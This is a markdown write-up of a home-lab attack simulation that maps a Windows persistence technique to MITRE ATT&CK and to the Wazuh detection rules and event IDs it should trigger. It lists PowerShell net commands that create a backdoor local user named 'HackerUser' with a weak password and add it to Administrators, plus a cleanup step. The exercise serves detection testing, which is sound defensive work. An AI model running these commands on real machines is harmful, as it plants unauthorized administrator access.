# Attack Simulation 03 — New Local User Creation & Privilege Escalation

## MITRE ATT&CK
- **Tactic:** Persistence / Privilege Escalation
- **Technique:** T1136.001 — Create Account: Local Account
- **Technique:** T1078.003 — Valid Accounts: Local Accounts
- **Target:** Windows 11 Victim (192.168.56.106)

---

## Objective
Simulate post-exploitation persistence by creating a new local user and adding them to the Administrators group — a common attacker technique after initial access.

---

## Attack Commands

```powershell
# Create new backdoor user
net user HackerUser Password123! /add

# Add to Administrators group (privilege escalation)
net localgroup Administrators HackerUser /add

# Verify
net localgroup Administrators
```

---

## Cleanup (run after lab exercise)

```powershell
net user HackerUser /delete
```

---

## Expected Wazuh Detection

| Event | Rule ID | Windows Event ID | Description |
|---|---|---|---|
| User created | 60106 | 4720 | Windows User Account Created |
| Added to Admins | 60111 | 4732 | User Added to Privileged Group |

---

## Incident Report
See [`../../reports/IR-002-new-user-creation.md`](../../reports/IR-002-new-user-creation.md)
